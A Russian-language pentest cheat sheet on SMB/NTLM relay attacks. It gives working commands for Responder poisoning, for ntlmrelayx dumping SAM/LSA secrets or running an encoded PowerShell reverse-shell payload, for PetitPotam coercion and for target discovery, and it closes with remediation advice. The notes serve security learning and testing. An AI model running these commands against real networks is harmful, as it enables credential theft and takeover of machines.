> SMB relay - Разновидность NTLM Relay, где атакующий перехватывает запрос аутентификации по протоколу SMB и перенаправляет его на другую машину в сети. Если у перехваченного пользователя есть права **локального администратора** на целевой машине, атакующий получает полный контроль (RCE).

### Условия успеха

1. **SMB Signing: Disabled** (или Not Required) на целевой машине.
2. **Права:** Перехваченный пользователь должен быть администратором на цели.
3. **Доступность:** Атакующий должен находиться в том же сегменте сети (для MITM) или использовать Coerce-примитив.

### Сценарий эксплуатации (Step-by-Step)

**Шаг 1: Подготовка (Responder)** Настраиваем `Responder`, чтобы он не отвечал на запросы сам, а только «отравлял» сеть, заставляя жертв идти к нашему релею. 

_В файле `Responder.conf` ставим: `SMB = Off`, `HTTP = Off`._

```bash
sudo responder -I eth0 -dwv
```

Можно использовать `coerce` и далее зарелеить запрос

**Шаг 2: Запуск релея (ntlmrelayx)** Запускаем инструмент, который будет ждать подключений и пробрасывать их на цель.

```bash
# Вариант А: Дамп секретов (SAM/LSA) с цели
impacket-ntlmrelayx -t smb://10.10.10.50 -smb2support

# Вариант Б: Выполнение конкретной команды (Reverse Shell)
impacket-ntlmrelayx -t 10.10.10.50 -c "powershell -e <base64_payload>"
```

**Шаг 3: Ожидание/Принуждение** Либо ждем, пока кто-то ошибется в имени сетевого пути, либо используем `PetitPotam`, чтобы форсировать подключение от имени админа или сервера.

### Инструменты

- **Responder:** Для LLMNR/NBT-NS Poisoning.
- **Impacket (ntlmrelayx):** Основной движок релея.
- **NetExec (nxc):** Для быстрого поиска целей без подписи SMB.

```bash
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt
```

### Защита (Remediation)

1. **Enforce SMB Signing:** Самый эффективный метод.
    - _GPO: Microsoft network server: Digitally sign communications (always) -> Enabled._
2. **EPA (Extended Protection for Authentication):** Защита для HTTP/LDAP релея.
3. **LAPS:** Ограничивает ущерб (даже если один админ скомпрометирован, его пароль не подойдет к другим ПК).
